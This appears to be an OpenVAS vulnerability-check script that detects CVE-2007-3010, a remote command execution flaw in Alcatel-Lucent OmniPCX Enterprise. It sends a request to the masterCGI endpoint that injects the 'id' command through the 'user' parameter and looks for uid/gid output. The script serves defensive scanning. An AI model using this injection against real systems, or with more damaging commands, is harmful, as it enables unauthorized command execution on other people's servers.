###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_alcatel_lucent_omnipcx_25694.nasl 12 2013-10-27 11:15:33Z jan $
#
# Alcatel-Lucent OmniPCX Enterprise Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Alcatel-Lucent OmniPCX Enterprise is prone to a remote command-
execution vulnerability because it fails to adequately sanitize user-
supplied data.

Attackers can exploit this issue to execute arbitrary commands with
the privileges of the 'httpd' user. Successful attacks may facilitate
a compromise of the application and underlying webserver; other
attacks are also possible.

Alcatel-Lucent OmniPCX Enterprise R7.1 and prior versions are
vulnerable to this issue.";

tag_solution = "The vendor has released an advisory along with fixes to address this
issue. Please see the referenced advisory for information on
obtaining fixes.";

if (description)
{
 script_id(103480);
 script_bugtraq_id(25694);
 script_cve_id("CVE-2007-3010");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 12 $");

 script_name("Alcatel-Lucent OmniPCX Enterprise Remote Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/25694");
 script_xref(name : "URL" , value : "http://www1.alcatel-lucent.com/enterprise/en/products/ip_telephony/omnipcxenterprise/index.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/479699");
 script_xref(name : "URL" , value : "http://www1.alcatel-lucent.com/psirt/statements/2007002/OXEUMT.htm");

 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-04-26 13:55:46 +0200 (Thu, 26 Apr 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = "/index.html"; 

if(http_vuln_check(port:port, url:url,pattern:"<title>OmniPCX")) {

  url = '/cgi-bin/masterCGI?ping=nomip&user=;id;';

  if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*",check_header:TRUE)) {
     
    security_hole(port:port);
    exit(0);

  } else {
    exit(99);
  }  
}

exit(0);

